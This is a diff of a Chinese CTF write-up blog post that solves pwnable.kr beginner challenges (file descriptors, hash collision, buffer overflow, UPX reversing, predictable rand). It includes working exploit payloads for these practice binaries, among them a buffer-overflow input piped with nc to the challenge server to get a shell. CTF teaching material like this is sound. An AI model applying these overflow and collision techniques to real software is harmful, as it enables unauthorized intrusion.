@@ -24,20 +24,20 @@ fd 是一个可执行文件，用于读取 flag 文件，其源码如下：
 #include <string.h>
 char buf[32];
 int main(int argc, char* argv[], char* envp[]){
-	if(argc<2){
-		printf("pass argv[1] a number\n");
-		return 0;
-	}
-	int fd = atoi( argv[1] ) - 0x1234;
-	int len = 0;
-	len = read(fd, buf, 32);
-	if(!strcmp("LETMEWIN\n", buf)){
-		printf("good job :)\n");
-		system("/bin/cat flag");
-		exit(0);
-	}
-	printf("learn about Linux file IO\n");
-	return 0;
+    if(argc<2){
+        printf("pass argv[1] a number\n");
+        return 0;
+    }
+    int fd = atoi( argv[1] ) - 0x1234;
+    int len = 0;
+    len = read(fd, buf, 32);
+    if(!strcmp("LETMEWIN\n", buf)){
+        printf("good job :)\n");
+        system("/bin/cat flag");
+        exit(0);
+    }
+    printf("learn about Linux file IO\n");
+    return 0;
 
 }
 {% endhighlight %}
@@ -50,17 +50,17 @@ int main(int argc, char* argv[], char* envp[]){
 
 此题可利用标准输入来将字符串 `LETMEWIN\n` 写到标准输入中，然后使得 `fd` 变量值为 `0` 即可从标注输入中读入。
 
-	fd@ubuntu:~$ echo "LETMEWIN" | ./fd 4660
-	good job :)
-	mommy! I think I know what a file descriptor is!!
-	
+    fd@ubuntu:~$ echo "LETMEWIN" | ./fd 4660
+    good job :)
+    mommy! I think I know what a file descriptor is!!
+    
 或者：
 
-	fd@ubuntu:~$ ./fd 4660
-	LETMEWIN
-	good job :)
-	mommy! I think I know what a file descriptor is!!
-	
+    fd@ubuntu:~$ ./fd 4660
+    LETMEWIN
+    good job :)
+    mommy! I think I know what a file descriptor is!!
+    
 
 ### [collision]
 
@@ -77,32 +77,32 @@ int main(int argc, char* argv[], char* envp[]){
 #include <string.h>
 unsigned long hashcode = 0x21DD09EC;
 unsigned long check_password(const char* p){
-	int* ip = (int*)p;
-	int i;
-	int res=0;
-	for(i=0; i<5; i++){
-		res += ip[i];
-	}
-	return res;
+    int* ip = (int*)p;
+    int i;
+    int res=0;
+    for(i=0; i<5; i++){
+        res += ip[i];
+    }
+    return res;
 }
 
 int main(int argc, char* argv[]){
-	if(argc<2){
-		printf("usage : %s [passcode]\n", argv[0]);
-		return 0;
-	}
-	if(strlen(argv[1]) != 20){
-		printf("passcode length should be 20 bytes\n");
-		return 0;
-	}
+    if(argc<2){
+        printf("usage : %s [passcode]\n", argv[0]);
+        return 0;
+    }
+    if(strlen(argv[1]) != 20){
+        printf("passcode length should be 20 bytes\n");
+        return 0;
+    }
 
-	if(hashcode == check_password( argv[1] )){
-		system("/bin/cat flag");
-		return 0;
-	}
-	else
-		printf("wrong passcode.\n");
-	return 0;
+    if(hashcode == check_password( argv[1] )){
+        system("/bin/cat flag");
+        return 0;
+    }
+    else
+        printf("wrong passcode.\n");
+    return 0;
 }
 {% endhighlight %}
 
@@ -110,10 +110,10 @@ int main(int argc, char* argv[]){
 
 此题直接将 `0x21DD09EC` 拆成5个数字的和即可，通过 `argv[1]` 输入时，需要注意使用小端序。
 
-	./col `python -c "print '\xc8\xce\xc5\x06' * 4 + '\xcc\xce\xc5\x06'"`
-	daddy! I just managed to create a hash collision :)
-	
-	
+    ./col `python -c "print '\xc8\xce\xc5\x06' * 4 + '\xcc\xce\xc5\x06'"`
+    daddy! I just managed to create a hash collision :)
+    
+    
 ### [bof]
 
 > Nana told me that buffer overflow is one of the most common software vulnerability. 
@@ -157,14 +157,78 @@ int main(int argc, char* argv[]){
 
 可以看到，`0xbffff590` 距离字符串开头的偏移为52个字节，因此为了成功地使程序跳转执行system("/bin/sh")，我们构造的输入字符串就应该为：
 
-	"A" * 52 + "\xbe\xba\xfe\xca"
-	
+    "A" * 52 + "\xbe\xba\xfe\xca"
+    
 此时，直接使用命令行远程打 payload：
 
-	(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
-	
+    (python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
+    
 ![img]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/bof-8.png)
 
 （当然，题目提供了 c 源码，也可以直接阅读源码进行分析）
 
+### [flag]
 
+> Papa brought me a packed present! let's open it.
+>
+> Download : http://pwnable.kr/bin/flag
+>
+> This is reversing task. all you need is binary
+
+使用 `file` 命令查看下载回来的 `flag` 文件，发现是一个64位的 ELF 可执行程序。通过查看，发现其具有明显的 UPX 压缩标志，所以解压之。
+
+![]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-1.png)
+
+通过 UPX 成功解压缩后得到 `flag-upx`，拖入 IDA 进行静态分析，发现在 `0x0000000000401184` 处引用了一个 `flag` 变量，通过 IDA 的交叉引用功能找到了该字符串，此值即为 flag。
+
+![]({{ site.url }}/public/img/article/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/flag-2.png)
+
+
+### [passcode]
+
+> Mommy told me to make a passcode based login system.
+>
+> My initial C code was compiled without any error!
+>
+> Well, there was some compiler warning, but who cares about that?
+>
+> ssh passcode@pwnable.kr -p2222 (pw:guest)
+
+
+(preloading...)
+
+
+### [random]
+
+> Daddy, teach me how to use random value in programming!
+>
+> ssh random@pwnable.kr -p2222 (pw:guest)
+
+{% highlight c %}
+#include <stdio.h>
+
+int main(){
+    unsigned int random;
+    random = rand();    // random value!
+
+    unsigned int key=0;
+    scanf("%d", &key);
+
+    if( (key ^ random) == 0xdeadbeef ){
+        printf("Good!\n");
+        system("/bin/cat flag");
+        return 0;
+    }
+
+    printf("Wrong, maybe you should try 2^32 cases.\n");
+    return 0;
+}
+{% endhighlight %}
+
+此题考察 c 语言中随机数生成的问题，`rand()` 若没有提供参数会在当前环境使用同一随机种子来生成随机数，而通过在 `/tmp` 目录下进行测试，服务器上 `rand()` 生成的默认随机数值为 `1804289383`，需要输入的 `key` 值就应为：`1804289383 ^ 0xdeadbeef = 3039230856`。
+
+    random@ubuntu:~$ ./random
+    3039230856
+    Good!
+    Mommy, I thought libc random is unpredictable...
+    
